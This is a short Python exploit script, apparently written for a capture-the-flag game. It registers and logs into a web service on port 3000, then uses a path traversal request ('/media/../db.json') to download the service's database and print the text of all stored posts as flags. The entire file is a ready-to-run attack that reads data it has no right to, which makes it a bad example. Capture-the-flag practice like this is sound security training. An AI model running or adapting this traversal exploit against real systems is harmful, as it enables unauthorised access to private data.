#!/usr/bin/env python3

import requests
import sys
import json
import random
import string

try:
    addr = sys.argv[1]
except IndexError:
    print('No IP was specified')
    sys.exit()

base_url = f'http://{addr}:3000'
name = ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(10)])
s = requests.Session()

# we have to sign up in order to acess the /media handle
s.post(base_url + '/signup', data = {
    'email': name,
    'name': name,
    'password': '123'
})

s.post(base_url + '/signin', data = {
    'email': name,
    'password': '123'
})

# now we simply dump the base and print the flags (implying they are indeed, flags)
dump = json.loads(s.get(base_url + '/media/../db.json').text)
for post in dump["posts"]: print(post["text"])
